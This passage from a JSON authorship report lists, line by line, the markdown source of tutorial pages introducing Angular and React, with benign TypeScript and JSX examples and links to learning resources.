        "content": "Angular provides developers with tools that enforce \"best practices\". Let us look at some of these tools."
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "* **TypeScript** - Angular applications are built using the TypeScript language, a superset of JavaScript."
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "TypeScript provides \u003ctooltip content\u003d\"Static typing involves type checking during compile-time as opposed to run-time. Types are associated with variables not values.\"\u003estatic typing\u003c/tooltip\u003e."
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "This helps the compiler show warnings about any potential errors in the code, before the app runs. Consider the following example: "
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "    ```typescript"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "    function add(x : number, y : number) : number {"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "        return x + y;"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "    add(\u0027a\u0027, \u0027b\u0027); // compiler flags an error"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "    ```"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "    In the code above, parameters `x` and `y` are declared to have the type `number`. Thus, the compiler shows an error when the function is called with strings as inputs to the function."
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "    "
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "    Another advantage of TypeScript is _Type Inference_ - TypeScript makes typing a bit easier and less explicit by the usage of type inference. Let us see how."
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "    "
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "    ```typescript"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "    let a \u003d \"some text\";"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "    let b \u003d 123;"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "    a \u003d b; // Compiler Error: Type \u0027number\u0027 is not assignable to type \u0027string\u0027"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "    ```    "
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "    "
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "    In the above code snippet, we are not explicitly defining `a: string` with a type annotation. TypeScript infers the type of the variable based on the value assigned to the variable. The value of `a` is a string and hence the type of `a` is inferred as `string`."
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "    Similarly, the type of `b` is inferred as `number`. Therefore, while inferring types, the compiler flags an error saying a `number` type cannot be assigned to a `string` type."
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "    "
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "    You can read this [article](https://medium.com/tech-tajawal/typescript-why-should-one-use-it-a539faa92010) to learn more about the features that TypeScript has to offer."
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "    "
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "* **Angular CLI** - Angular CLI stands for Angular Command Line Interface. It is a command line tool for managing Angular apps. "
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "    With the CLI you can perform the following commands to ease the development process."
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "     - Generate a new Angular application with - `ng new`"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "     - Generate Angular files - `ng generate`"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "     - Build your application for deployment - `ng build`"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "     "
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "    You can refer to the [official documentation](https://cli.angular.io/) for a complete list of the CLI commands."
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "    "
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "    The Angular CLI also helps developers follow good development practices. For example, "
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "    The Angular CLI has out-of-the-box integration with \u003ctooltip content\u003d\"Codelyzer is an open source tool that checks whether the pre-defined coding guidelines have been followed\"\u003e**Codelyzer**\u003c/tooltip\u003e."
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "    Codelyzer lints your code against the [official Angular style guide](https://angular.io/guide/styleguide). With Angular CLI, you can simply run the command `ng lint` to get an analysis of whether your code follows the \"best practices\"."
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "        "
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "This [article](https://medium.freecodecamp.org/best-practices-for-a-clean-and-performant-angular-application-288e7b39eb6f) provides a comprehensive list of best tooling services offered by Angular."
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": " "
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Benefit 2: Cross-Platform Development"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "Using the modern versions of Angular, developers can build applications that live on the web, mobile, or the desktop."
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "* **Progressive Web Apps** - PWAs are web-based applications that contain most of the benefits of a typical mobile app. The [official documentation](https://developers.google.com/web/progressive-web-apps/) written by Google describes PWAs to be reliable, fast and engaging. With Angular you can develop PWAs and provide an immersive user experience."
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "This [article](https://medium.com/@nsmirnova/creating-pwa-with-angular-5-e36ea2378b5d) is a good place to learn the basics of building PWAs using Angular."
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "* **Native Apps** - Angular can be used to build \u003ctooltip content\u003d\"a smartphone application that is coded in a specific programming language, such as Swift for iOS or Java for Android operating systems\"\u003enative mobile applications\u003c/tooltip\u003e. There are many frameworks such as [NativeScript](https://www.nativescript.org/) and [Ionic](https://ionicframework.com/)"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "that can be integrated with Angular for mobile application development. As per the [official Ionic website](https://ionicframework.com/docs/intro), it is easy to integrate Ionic with the Angular."
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "* **Desktop Apps** - With Angular you can create desktop applications across Mac, Windows and Linux systems. In order for your application to be compatible with the different Operating Systems, you can use the \u003ctooltip content\u003d\"Electron is a framework that provides a set of APIs to interact with the Windows, OS X, and Linux operating systems. It makes cross-platform development easier.\"\u003e[Electron](https://electronjs.org/)\u003c/tooltip\u003e framework."
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "You can integrate the Electron framework in your project using the Angular CLI and start building your application."
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": "This [article](https://medium.com/@yannmjl/how-to-build-native-cross-platform-desktop-apps-with-angular-electron-bd1d6e3919b2) is a good introduction to building desktop apps with Angular and Electron."
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Benefit 3: Two-Way Data Binding"
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": "Web apps have two main components, a _View_ and a _Model_. The View component is responsible for displaying data (i.e., the part users see). The Model is concerned with the logic implementation of the application. It updates and retrieves the data to and from the database."
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "_Data binding_ refers to the exchange of data between the View and Model components. There are two types of data binding as shown below."
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ccenter\u003e"
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cimg src\u003d\"data.jpg\" width\u003d\"50%\"\u003e"
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": "_Figure 2. Types of data binding_ ([source](https://osmangoni.info/posts/one-way-and-two-way-data-binding/))"
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/center\u003e"
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": "Some frameworks like [React](https://reactjs.org/docs/thinking-in-react.html) provide one-way data binding i.e., when there is a change to the Model, the View updates automatically."
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "However, if the app allows users to change data through the view (e.g., entering your name in the textbox), the developer has to write code to propagate that change to the Model."
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": "In contrast, Angular provides data binding in both ways. That means even changes to the View can be propagated to the Model automatically, without writing extra code for that."
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": "This [article](https://medium.com/@preethi.s/angular-custom-two-way-data-binding-3e618309d6c7) on Medium provides a good introduction to two-way data binding in Angular."
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Disadvantages of Angular"
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": "Like any other framework/library, Angular has its share of disadvantages."
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "1. **Steep Learning Curve:** \u003cbr/\u003e"
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "Angular requires you to learn many concepts, such as _directives_, modules, components, services and many more. The large number of new concepts can be confusing to newcomers. Additionally, Angular requires you to learn a new language, TypeScript."
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "2. **Opinionated Framework:**\u003cbr/\u003e"
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "Angular is opinionated about how you structure your code. This means that Angular provides you defaults for building applications. For instance, there are in-built services to perform data fetching, state management and much more. It is also opinionated about the development language as it requires you to use TypeScript.\u003cbr/\u003e"
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "-"
        },
        "content": "In contrast, React allows you to integrate any third party services in your application."
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": "    "
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Comparison With Other Popular Frontend Frameworks"
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "[React](https://reactjs.org/) and [Vue](https://vuejs.org/) are two popular alternatives to Angular."
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "-"
        },
        "content": "React is a popular Javascript library, open sourced by Facebook. The ease of learning React is a key advantage over Angular."
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "-"
        },
        "content": "It also provides more flexibility as it allows integration of third party libraries."
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "-"
        },
        "content": "Vue, another open-source JavaScript framework, offers some advantages over Angular, like increased flexibility, simple structure and ease of integration. This makes it easier to learn Vue as compared to Angular or React."
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "-"
        },
        "content": "Below are a few resources that give a brief comparison between these popular frontend frameworks."
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "-"
        },
        "content": "1. [React vs Angular vs Vue](https://medium.com/@TechMagic/reactjs-vs-angular5-vs-vue-js-what-to-choose-in-2018-b91e028fa91d) - A brief comparison between the three most popular frontend tools."
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "-"
        },
        "content": "2. [Why use Vue](https://medium.com/@brainmobi/advantages-of-using-vue-js-for-your-web-applications-7e460cadfffc) - Advantages of using Vue."
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "-"
        },
        "content": "3. [Angular vs React](https://programmingwithmosh.com/react/react-vs-angular/) - A comprehensive comparison between React and Angular."
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Getting Started With Angular"
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "-"
        },
        "content": "Given below are a few steps that will help you ease into the Angular environment:"
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "-"
        },
        "content": "1. [Different versions of Angular](https://www.simplilearn.com/angularjs-vs-angular-2-vs-angular-4-differences-article) - Before you start learning Angular, you must have a clear idea of its different versions."
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "-"
        },
        "content": "2. [Start learning TypeScript](https://www.typescriptlang.org/docs/home.html) - Development in Angular relies heavily on TypeScript. You can start learning the basics of the new language from its official website."
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "-"
        },
        "content": "3. [The official Angular website](https://angular.io/guide/quickstart) - offers a good tutorial to get started. It shows you how to build and run a simple \"Hello World\" application in Angular."
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "-"
        },
        "content": "4. [Build your first Angular app](https://scrimba.com/g/gyourfirstangularapp) - You are recommended to complete this course taught by an Angular expert. It teaches you the important concepts of Angular in the form of interactive tutorials."
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "-"
        },
        "content": "5. [StackOverflow Questions on Angular](https://stackoverflow.com/questions/tagged/angular?sort\u003dvotes\u0026pageSize\u003d50) - You can also refer to this list of top voted questions on Angular if you need help while developing your own Angular application."
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 13,
      "-": 221
    }
  },
  {
    "path": "contents/javascript/Javascript-framework-React.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "  title: Introduction to React"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "# Introduction to React"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "**Author: [Aadyaa Maddi](https://github.com/amad-person)** \u003cbr\u003e"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: [Amrut Prabhu](https://github.com/amrut-prabhu), [Marvin Chin](https://github.com/marvinchin)"
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## What is React?"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": "The [official website](https://reactjs.org/tutorial/tutorial.html#what-is-react) describes React as follows:"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "\u003e*React* is a declarative, efficient, and flexible JavaScript library for building user interfaces. It lets you compose complex UIs from small and isolated pieces of code called \u0027components\u0027. "
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": ""
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## React Features"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": "Let us understand some key features of React with the help of an example. A web application that displays the name of a person is given below:  "
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ciframe src\u003d\"https://codesandbox.io/embed/8kxx088nx2?fontsize\u003d12\u0026view\u003dpreview\" style\u003d\"width:100%; height:400px; border:0; border-radius: 4px; overflow:hidden;\" sandbox\u003d\"allow-modals allow-forms allow-popups allow-scripts allow-same-origin\"\u003e\u003c/iframe\u003e"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbox type\u003d\"info\"\u003e"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "    The sandbox above is editable. You can change the name using the textbox in the application and see how the UI automatically gets updated. You can view the application code by clicking the blue button next to \"React: An Introductory Example\". "
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Declarative Framework"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "The UI of a React application is defined using a mix of HTML code and HTML-like syntax, called [JSX](https://reactjs.org/docs/introducing-jsx.html). The main view of the application above (defined in the `App.render()` method in `index.js`) is given as follows:"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "```jsx"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv className\u003d\"App\"\u003e"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003ch1\u003ePerson Data\u003c/h1\u003e"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003cPersonComponent"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "    name\u003d{this.state.name}"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "    changeHandler\u003d{this.handleChange}"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "  /\u003e"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "In the above example, we declare what we want to display (i.e. `name`) and React renders the appropriate view based on the updated application data. This is known as the \u003ctooltip content\u003d\"Declarative programming focuses on what the program should accomplish without specifying how the program should achieve the result.\"\u003e*declarative*\u003c/tooltip\u003e approach. With the declarative approach, you just need to specify *what* you want to show in the UI when the application data changes, rather than giving instructions on *how* to update the UI. "
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Components"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "React encapsulates application views and relevant data and logic for updating the views using *components*. A combination of components that exchange information with one another is used to build the UI of a React application. "
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "For example, the application above is divided into two components: "
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "1. **App**"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "    The `App` component (defined in `index.js`) contains the main view of the application. It stores the application data (i.e. `name`) in an object called *`state`* and has a method to update the it every time the value in the textbox changes. It passes the application data and the method to the `PersonComponent`."
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "    "
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "    ```jsx"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "niqiukun"
        },
        "content": "    function App() {"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "niqiukun"
        },
        "content": "      const [name, setName] \u003d useState(\"John Doe\");"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "niqiukun"
        },
        "content": "      const handleChange \u003d event \u003d\u003e {"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "niqiukun"
        },
        "content": "        setName(event.target.value);"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "      };"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "      return ("
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "        \u003cdiv className\u003d\"App\"\u003e"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "          \u003ch1\u003ePerson Data\u003c/h1\u003e"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "          \u003cPersonComponent"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "niqiukun"
        },
        "content": "            name\u003d{name}"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "niqiukun"
        },
        "content": "            changeHandler\u003d{handleChange}"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "          /\u003e"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "        \u003c/div\u003e"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "      );"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "    ```"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "2. **PersonComponent**"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "    `PersonComponent` (defined in `personComponent.js`) renders the details of the person. It accepts input from the `App` component in the form of *`props`*."
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "    "
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "    ```jsx"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "    const PersonComponent \u003d props \u003d\u003e {"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "      return ("
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "        \u003cdiv className\u003d\"Person\"\u003e"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "          \u003ch2\u003eAbout Me\u003c/h2\u003e"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "          \u003cp\u003eMy name is {props.name}.\u003c/p\u003e"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "          \u003clabel htmlFor\u003d\"name\"\u003eName: \u003c/label\u003e"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "          \u003cinput id\u003d\"name\" onChange\u003d{props.changeHandler} value\u003d{props.name} /\u003e"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "        \u003c/div\u003e"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "      );"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "    };"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "    ```"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "As you can see, React components are just JavaScript functions that accept arbitrary input and return a declarative view describing what should appear in the application\u0027s UI. "
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### One-Way Data Binding"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "*Data binding* refers to the exchange of information between the application data and the UI. React provides *one-way* data binding. In applications that use one-way data binding, changes to the application data are automatically reflected in the UI. However, changes to the UI need to be manually propagated to the application data. "
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "In the above application, you can see that the UI is updated whenever a different name is entered in the textbox. These updates do not happen in a single step - the application data is first updated using the `handleChange()` method, and then the UI is updated to reflect these changes. "
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Why use React?"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
